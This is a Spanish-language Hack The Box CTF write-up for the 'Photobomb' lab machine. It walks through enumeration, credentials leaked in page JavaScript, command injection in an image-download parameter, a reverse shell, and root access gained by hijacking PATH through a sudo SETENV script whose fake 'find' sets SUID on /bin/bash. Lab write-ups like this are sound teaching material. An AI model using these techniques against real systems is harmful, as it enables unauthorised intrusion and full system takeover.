+++
author = "Andrés Del Cerro"
title = "Hack The Box: Photobomb Writeup | Easy"
date = "2024-09-01"
description = ""
tags = [
    "HackTheBox",
    "Photobomb",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "Information Disclosure",
    "Command Injection",
    "Abusing Sudo",
    "Abusing SETENV",
    "Path Hijacking",
    "Privilege Escalation"
]

+++

# Hack The Box: Photobomb Writeup

Welcome to my detailed writeup of the easy difficulty machine **"Photobomb"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.228.60 --ulimit 5000 -g
10.129.228.60 -> [22,80]
```

```console
$ nmap -p22,80 -sCV 10.129.228.60 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 01:12 CEST
Nmap scan report for 10.129.228.60
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.60 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 01:12 CEST
Nmap scan report for 10.129.228.60
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
1072/udp  closed cardax
17814/udp closed unknown
17824/udp closed unknown
19283/udp closed keysrvr
19647/udp closed unknown
33872/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
```

Del escaneo inicial encontramos el dominio `photobomb.htb`, lo añadimos al `/etc/hosts`
# HTTP Enumeration
`whatweb` no nos reporta nada interesante ni ningún CMS.
```console
$ whatweb http://photobomb.htb
http://photobomb.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.228.60], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Así se ve el sitio web.
![Write-up Image](images/Screenshot_1.png)

Encontramos una ruta `/printer` en la página principal que nos pide credenciales.
![Write-up Image](images/Screenshot_2.png)

En el código fuente vemos un script `photobomb.js`
![Write-up Image](images/Screenshot_3.png)

## Information Leakage
Si lo inspeccionamos es lo siguiente.
```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

Vemos una ruta `http://pH0t0:b0Mb!@photobomb.htb/printer` donde se hace una autenticación HTTP.
- Usuario -> pH0t0
- Contraseña -> b0Mb!

Con estas credenciales conseguimos acceder a la ruta protegida.
![Write-up Image](images/Screenshot_4.png)

Vemos varias opciones para descargarnos una imagen.
![Write-up Image](images/Screenshot_5.png)

## Command Injection -> Foothold
Si lo inspeccionamos con `exiftool` no encontramos nada relevante.
```console
$ exiftool image.jpg                                                                                                                                                                                                                                   01:17:35 [67/135]
ExifTool Version Number         : 12.57                                                                                                                                                                                                                                         
File Name                       : image.jpg                                                                                                                                                                                                                                     
Directory                       : .                                                                                                                                                                                                                                             
File Size                       : 16 kB                                                                                                                                                                                                                                         
File Modification Date/Time     : 2024:09:02 01:17:22+02:00                                                                                                                                                                                                                     
File Access Date/Time           : 2024:09:02 01:17:22+02:00                                                                                                                                                                                                                     
File Inode Change Date/Time     : 2024:09:02 01:17:29+02:00                                                                                                                                                                                                                     
File Permissions                : -rw-r--r--                                                                                                                                                                                                                                    
File Type                       : JPEG                                                                                                                                                                                                                                          
File Type Extension             : jpg                                                                                                                                                                                                                                           
MIME Type                       : image/jpeg                                                                                                                                                                                                                                    
JFIF Version                    : 1.01                                                                                                                                                                                                                                          
Resolution Unit                 : inches                                                                                                                                                                                                                                        
X Resolution                    : 72                                                                                                                                                                                                                                            
Y Resolution                    : 72                                                                                                                                                                                                                                            
Profile CMM Type                : Little CMS                                                                                                                                                                                                                                    
Profile Version                 : 2.1.0                                                                                                                                                                                                                                         
Profile Class                   : Display Device Profile                                                                                                                                                                                                                        
Color Space Data                : RGB                                                                                                                                                                                                                                           
Profile Connection Space        : XYZ                                                                                                                                                                                                                                           
Profile Date Time               : 2012:01:25 03:41:57                                                                                                                                                                                                                           
Profile File Signature          : acsp                                                                                                                                                                                                                                          
Primary Platform                : Apple Computer Inc.                                                                                                                                                                                                                           
CMM Flags                       : Not Embedded, Independent                                                                                                                                                                                                                     
Device Manufacturer             :                                                                                                                                                                                                                                               
Device Model                    :                                                                                                                                                                                                                                               
Device Attributes               : Reflective, Glossy, Positive, Color                                                                                                                                                                                                           
Rendering Intent                : Perceptual                                                                                                                                                                                                                                    
Connection Space Illuminant     : 0.9642 1 0.82491                                                                                                                                                                                                                              
Profile Creator                 : Little CMS                                                                                                                                                                                                                                    
Profile ID                      : 0                                                                                                                                                                                                                                             
Profile Description             : c2                                                                                                                                                                                                                                            
Profile Copyright               : IX                                                                                                                                                                                                                                            
Media White Point               : 0.9642 1 0.82491                                                                                                                                                                                                                              
Media Black Point               : 0.01205 0.0125 0.01031                                                                                                                                                                                                                        
Red Matrix Column               : 0.43607 0.22249 0.01392                                                                                                                                                                                                                       
Green Matrix Column             : 0.38515 0.71687 0.09708                                                                                                                                                                                                                       
Blue Matrix Column              : 0.14307 0.06061 0.7141                                                                                                                                                                                                                        
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)                                                                                                                                                                                              
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)                                                                                                                                                                                              
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)                                                                                                                                                                                              
Image Width                     : 600                                                                                                                                                                                                                                           
Image Height                    : 400                                                                                                                                                                                                                                           
Encoding Process                : Baseline DCT, Huffman coding                                                                                                                                                                                                                  
Bits Per Sample                 : 8                                 
Color Components                : 3                                 
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)                                                                                      
Image Size                      : 600x400                           
Megapixels                      : 0.240 
```

Si nos descargamos la misma imagen pero en máxima resolución vemos que se tarda mucho mas tiempo en descargar (en generar la descarga, no en descargar como tal).

Esto me hace pensar que quizás se está generado/procesando por detrás.

Al interceptar la petición vemos que se especifica el nombre de la imagen mediante el parámetro `photo`
![Write-up Image](images/Screenshot_6.png)

Probando a cargar otros archivos no conseguí nada.

Teniendo en cuenta que posiblemente por detrás se esté utilizando `imagemagick` o algo para redimensionar las imágenes podemos probar a inyectar un comando.

Después de varias pruebas, vemos que en el parámetro `filetype` podemos conseguir inyectar un comando **importante URL encodear los espacios**.
![Write-up Image](images/Screenshot_7.png)

```console
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:30:19.362031 IP photobomb.htb > 10.10.14.108: ICMP echo request, id 7, seq 1, length 64
01:30:19.362065 IP 10.10.14.108 > photobomb.htb: ICMP echo reply, id 7, seq 1, length 64
```

 Ahora podemos mandarnos una revshell poniéndonos en escucha con `pwncat-cs` por el puerto 443.

```console
$ sudo pwncat-cs -lp 443
```

Podemos utilizar el típico one-liner para mandarnos una consola pero esta vez url-encodeado.
![Write-up Image](images/Screenshot_8.png)

¡Y conseguimos una consola!
![Write-up Image](images/Screenshot_9.png)

Podemos ver la flag de usuario.
```console
(remote) wizard@photobomb:/home/wizard$ cat user.txt 
105df33b2ae4ee6...
```

# Privilege Escalation
Detectamos que no hay otro usuario en el sistema a parte de `root`
```console
(remote) wizard@photobomb:/home/wizard$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
wizard:x:1000:1000:wizard:/home/wizard:/bin/bash
```

Detectamos que podemos ejecutar como el usuario `root` y podemos cambiar las variables de entorno gracias al atributo `SETENV` en tiempo de ejecución el script `/opt/cleanup.sh`
```console
(remote) wizard@photobomb:/home/wizard$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Este es el script.
```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Este script de Bash realiza las siguientes tareas:

1. **Carga configuraciones** desde un archivo `.bashrc`.
2. **Cambia al directorio** `/home/wizard/photobomb`.
3. **Gestiona un archivo de log**, archivando su contenido si no está vacío y luego lo vacía.
4. **Protege archivos JPEG** en el directorio `source_images` cambiando su propietario a `root`.

## Path Hijacking -> Abusing `SETENV`

Vemos que se hace una llamada relativa al binario `find` 

Y como tenemos el control sobre las variables de entorno gracias a `SETENV` significa que podríamos secuestrar el binario de `find` para ejecutar un comando a nivel de sistema como el usuario `root`

Vamos a crear un archivo en `/tmp` llamado `find` el cual será un simple script que establece el bit SUID de `/bin/bash` para poder lanzarnos una `bash` como `root`
```console
(remote) wizard@photobomb:/tmp$ cat find 
#!/bin/bash

chmod u+s /bin/bash
```

Le damos permiso de ejecución.
```console
(remote) wizard@photobomb:/tmp$ chmod +x find 
```

Ahora si ejecutamos como `root` el script pero estableciendo la variable de entorno `PATH` para que primero busque binarios en `/tmp` y luego en los directorios que ya estaba definido 
anteriormente...
```console
(remote) wizard@photobomb:/opt$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

```console
(remote) wizard@photobomb:/opt$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Y ya podemos conseguir una consola como `root` lanzando una `bash` con el parámetro `-p`
```console
(remote) root@photobomb:/opt# id
uid=1000(wizard) gid=1000(wizard) euid=0(root) groups=1000(wizard)
```

Y vemos que el EUID es 0 (root)

Podemos leer la flag de root
```console
(remote) root@photobomb:/root# cat root.txt 
9dac3e4917e20d...
```

¡Y ya estaría!

Happy Hacking! 🚀